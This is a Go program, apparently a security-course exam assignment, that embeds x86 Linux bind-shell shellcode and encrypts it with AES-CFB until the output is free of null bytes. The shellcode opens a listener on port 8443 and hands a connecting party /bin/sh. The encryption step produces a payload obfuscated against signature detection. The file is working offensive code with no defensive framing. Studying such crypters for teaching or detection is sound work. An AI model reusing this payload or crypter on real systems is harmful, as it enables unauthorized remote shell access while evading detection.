// SLAE Exam Assignment #7: Shellcode Encrypter
// Author: Rikih Gunawan

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"strings"
)

func main() {

	origShellcode := []byte{
		0x31, 0xc9, 0xf7, 0xe1, 0x99, 0x6a, 0x66, 0x58, 0x6a,
		0x01, 0x5b, 0x51, 0x6a, 0x01, 0x6a, 0x02, 0x89, 0xe1,
		0xcd, 0x80, 0x97, 0x6a, 0x66, 0x58, 0x6a, 0x02, 0x5b,
		0x52, 0x66, 0x68, 0x20, 0xfb, 0x66, 0x53, 0x89, 0xe1,
		0x6a, 0x10, 0x51, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0x6a,
		0x66, 0x58, 0x6a, 0x04, 0x5b, 0x31, 0xf6, 0x56, 0x57,
		0x89, 0xe1, 0xcd, 0x80, 0x6a, 0x66, 0x58, 0x6a, 0x05,
		0x5b, 0x56, 0x56, 0x57, 0x89, 0xe1, 0xcd, 0x80, 0x89,
		0xc3, 0x6a, 0x02, 0x59, 0xb0, 0x3f, 0xcd, 0x80, 0x49,
		0x79, 0xf9, 0x6a, 0x0b, 0x58, 0x31, 0xc9, 0x51, 0x51,
		0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69,
		0x6e, 0x89, 0xe3, 0xcd, 0x80}

	if len(os.Args[1]) != 16 {
		fmt.Println("ERROR: Key must be 16 chars")
		os.Exit(1)
	}
	//key := []byte("deadbeefdeafface")
	key := []byte(os.Args[1])

	fmt.Printf("[+] Original shellcode:\n")
	for x, element := range origShellcode {
		if x == len(origShellcode)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}
	fmt.Printf("\n\n")

	fmt.Printf("[x] Key:\n%s\n\n", key)

	cryptoText := []byte{}
	valid := true
	i := 0

	fmt.Println("[+] Trying to encrypt the shellcode..")
	for valid {
		fmt.Println("Iter: ", i)

		// encrypt
		cryptoText = encrypt(key, origShellcode)
		nullIndex := strings.Index(string(cryptoText), "\x00")

		if nullIndex < 0 {
			valid = false
		} else {
			fmt.Printf("[-] Null bytes found!: index=%v\n", nullIndex)
			fmt.Printf("% x", cryptoText)
			fmt.Printf("\n\n")
		}
		i++
	}

	fmt.Printf("[*] Encrypted shellcode (null free):\n")
	for x, element := range cryptoText {
		if x == len(cryptoText)-1 {
			fmt.Printf("%#x", element)
		} else {
			fmt.Printf("%#x,", element)
		}
	}

	fmt.Printf("\n\n")
}

func encrypt(key []byte, text []byte) []byte {
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	ctext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ctext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ctext[aes.BlockSize:], plaintext)

	return ctext
}
